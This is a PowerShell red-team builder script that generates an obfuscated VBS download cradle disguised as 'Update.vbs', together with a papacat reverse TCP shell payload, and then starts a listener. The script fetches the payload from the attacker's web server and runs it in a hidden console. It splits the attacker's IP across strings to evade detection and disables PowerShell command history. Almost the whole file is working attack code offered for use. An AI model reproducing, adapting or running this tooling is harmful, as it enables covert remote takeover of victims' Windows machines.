<#
.SYNOPSIS
   Builder.ps1 - pow`er`cat Automation - Obfuscation

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: papacat {auto-download}
   Optional Dependencies: http.server {python3}
   PS cmdlet Dev version: v1.0.2

.DESCRIPTION
   Cmdlet creates Update.vbs that downloads\executes revtcpshell.ps1 from attacker webserver
   cmdlet then starts a handler ( listenner ) to wait for client (rev tcp shell) connection.

.NOTES

.Parameter ClientName
   Reverse tcp shell name (default: revshell)

.Parameter VbsName
   Vbscript download crandle name (default: update)

.Parameter Execute
   Specify the name of the process to start (default: cmd.exe)

.Parameter TimeOut
   The seconds to wait before giving up on listening (default: 120)

.Parameter serverPort
   Python3 http.server port number (default: 8080)

.Parameter PayloadPort
   Reverse tcp shell port number (default: 666)

.EXAMPLE
   PS C:\> .\Builder.ps1 -ClientName "revtcpshell" -VbsName "Update" -PayloadPort "4444"

.EXAMPLE
   PS C:\> .\Builder.ps1 -PayloadPort "4444" -serverPort "8087" -Execute "powershell.exe" -TimeOut "120"

.INPUTS
   None. You cannot pipe objects into Builder.ps1

.OUTPUTS
   * papacat reverse tcp shell builder.
   * using webserver to deliver payload
   * created: 'C:\Users\pedro\Coding\redpill\utils\papacat_rev_shell\Update.vbs'
   * download papacat from github repository.
   * Generate cmd client (payload) obfucated
   * created: 'C:\Users\pedro\Coding\redpill\utils\papacat_rev_shell\revshell.ps1'
     ----------------------------------------------
     Copy Update.vbs + revshell.ps1 to http.server
     And deliver Update.vbs to target system
     ----------------------------------------------
   VERBOSE: Start papacat handler ( listenner )
   VERBOSE: Set Stream 1: TCP
   VERBOSE: Set Stream 2: Console
   VERBOSE: Setting up Stream 1...
   VERBOSE: Listening on [0.0.0.0] (port 666)

.LINK
   https://github.com/r00t-3xp10it/redpill/tree/main/utils/papacat_rev_shell
   https://gist.github.com/r00t-3xp10it/80fa09009f9e56302a33ec377e507295?permalink_comment_id=4078577#gistcomment-4078577
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$ClientName="revshell",
   [string]$Execute="cmd.exe",
   [string]$VbsName="Update",
   [int]$serverPort='8080',
   [int]$PayloadPort='666',
   [int]$timeout='120'
)


#Variable declarations
$Python_version = $null
$ClientRawn = $ClientName
$VbsName = "$VbsName" + ".vbs" -Join ''
$CmdletVersion = "v1.0.2" #CmdLet version
$ClientName = "$ClientName" + ".ps1" -Join ''
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@papacat $CmdletVersion {SSA@RedTeam}"

$Local_Host = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
$FirstRange = $Local_Host[0,1,2,3,4] -join ''                          # 192.1
$SeconRange = $Local_Host[5,6,7,8] -join ''                            # 68.1
$TrithRange = $Local_Host[9,10,11,12,13,14,15,16,17,18,19,20] -join '' #.72
$LastRanges = "$TrithRange" + ":" + "$serverPort" -join ''             #.72:8080


$Banner = @"

      * pow`er`cat obfuscated version [$CmdletVersion] *
██████╗  █████╗ ██████╗  █████╗  ██████╗ █████╗ ████████╗
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝
██████╔╝███████║██████╔╝███████║██║     ███████║   ██║   
██╔═══╝ ██╔══██║██╔═══╝ ██╔══██║██║     ██╔══██║   ██║   
██║     ██║  ██║██║     ██║  ██║╚██████╗██║  ██║   ██║   
╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝
                         
"@;
Clear-Host;
Write-Host $Banner -ForegroundColor Blue
Write-Host "* papacat reverse tcp shell builder." -ForegroundColor Green
Start-Sleep -Milliseconds 500


#Crandlers ( download \ execution )
$VbsCrandle = @("' Author: @r00t-3xp10it (ssa)
' Application: papacat download crandle
' Description:
'   This VBS will download $ClientName (rev tcp shell) from attacker webserver
'   imports module and executes the module in a hidden console. ( background )
' ---

dIm Char,Cmd,Layback
Char=`"@!$FirstRange!`"+`":007:$SeconRange@!`"+`"$LastRanges@!`"
Layback=rEpLaCe(Char, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")

set ObjConsole = CreateObject(`"Wscript.Shell`")
ObjConsole.Run(`"powershell.exe cd `$Env:TMP;iwr -Uri http://`"+Cmd+`"/$ClientName -OutFile $ClientName;Import-Module -Name .\$ClientName -Force;$ClientRawn -c $Local_Host -e $Execute -p $PayloadPort -t $timeout`"), 0
}")


$VbsExecution = @("' Author: @r00t-3xp10it (ssa)
' Application: papacat execution crandle
' Description:
'   This VBS imports $ClientName and executes $ClientName in a hidden console.
' ---

set ObjConsole = CreateObject(`"Wscript.Shell`")
ObjConsole.Run(`"powershell.exe Import-Module -Name .\$ClientName -Force;$ClientRawn -c $Local_Host -e $Execute -p $PayloadPort -t $timeout`"), 0
}")


try{#Check Attacker python version (http.server)
   $Python_version = python -V|Select-String "3."
}catch{}


If($Python_version)
{
   Write-Host "*" -ForegroundColor Green -NoNewline;
   Write-Host " using webserver to deliver payload" -ForegroundColor DarkGray
   Start-Sleep -Milliseconds 500

   #Write the vbs file on disk
   Write-Host "*" -ForegroundColor Yellow -NoNewline;
   echo $VbsCrandle|Out-File "$VbsName" -Encoding string -Force
   Write-Host " created: '$pwd\$VbsName'" -ForegroundColor DarkGray
   Start-Sleep -Milliseconds 500
}
Else
{
   Write-Host "*" -ForegroundColor Red -NoNewline;
   Write-Host " webserver not found. (manual execution)" -ForegroundColor DarkGray
   Start-Sleep -Milliseconds 500

   #Write the vbs file on disk
   Write-Host "*" -ForegroundColor Yellow -NoNewline;
   echo $VbsExecution|Out-File "$VbsName" -Encoding string -Force
   Write-Host " created: '$pwd\$VbsName'" -ForegroundColor DarkGray
   Start-Sleep -Milliseconds 500
}


#Download papacat
Write-Host "*" -ForegroundColor Green -NoNewline;
Write-Host " download papacat from github repository." -ForegroundColor DarkGray
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/papacat_rev_shell/papacat.ps1" -OutFile "papacat.ps1"|Unblock-File
Start-Sleep -Milliseconds 500

#Generate - Cmd Client (payload) Obfucated
Import-Module -Name .\papacat.ps1 -Force
Write-Host "*" -ForegroundColor Green -NoNewline;
papacat -c $Local_Host -e $Execute -p $PayloadPort -t $timeout -g > $ClientName
Write-Host " Generate cmd client (payload) obfucated" -ForegroundColor DarkGray
Start-Sleep -Milliseconds 500


If(Test-Path -Path "$ClientName" -EA SilentlyContinue)
{
   Write-Host "*" -ForegroundColor Yellow -NoNewline;
   #replace - Main @('192.168.1.72',$False,666,120) @('cmd.exe')
   Write-Host " created: '$pwd\$ClientName'" -ForegroundColor DarkGray
   ((Get-Content -Path $ClientName -Raw) -Replace "Main @\('$Local_Host'","`$Ob = `"$FirstRange`"+`"$SeconRange`"+`"$TrithRange`" -Join ''`nMain @(`$Ob")|Set-Content -Path $ClientName
   Start-Sleep -Milliseconds 500
}
Else
{
   Write-Host "*" -ForegroundColor Red -NoNewline;
   Write-Host " fail to create: '$pwd\$ClientName' (abort)`n" -ForegroundColor DarkGray
   exit #Exit Builder
}

Write-Host "  ----------------------------------------------"
Write-Host "  Copy $VbsName + $ClientName to http.server"
Write-Host "  And deliver $VbsName script to target system"
Write-Host "  ----------------------------------------------"
Start-Sleep -Seconds 2


#Start handler ( listenner )
Write-Host "VERBOSE: Start papacat handler ( listenner )" -ForegroundColor Green
Start-Sleep -Milliseconds 500;papacat -l -p $PayloadPort -t $timeout -v


#Cleanning
Remove-Item -Path "$pwd\$VbsName" -EA SilentlyContinue -Force
Remove-Item -Path "$pwd\$ClientName" -EA SilentlyContinue -Force
Remove-Item -Path "$pwd\papacat.ps1" -EA SilentlyContinue -Force